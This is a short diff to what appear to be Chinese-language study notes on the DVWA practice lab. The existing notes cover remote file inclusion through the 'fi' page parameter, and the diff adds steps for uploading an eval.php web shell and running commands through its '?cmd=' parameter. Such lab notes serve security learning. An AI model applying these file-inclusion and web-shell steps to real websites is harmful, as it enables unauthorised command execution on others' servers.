@@ -27,3 +27,8 @@ File Inclusion
 建立一個phpinfo.txt放在另外一個伺服器上
 透過/dvwa/vulnerabilities/fi/page=http://localhost/phpinfo.txt進行讀取
 ---
+File Upload
+---
+上傳一eval.php
+ip/dvwa/hackable/uploads/eval.php?cmd=指令
+---
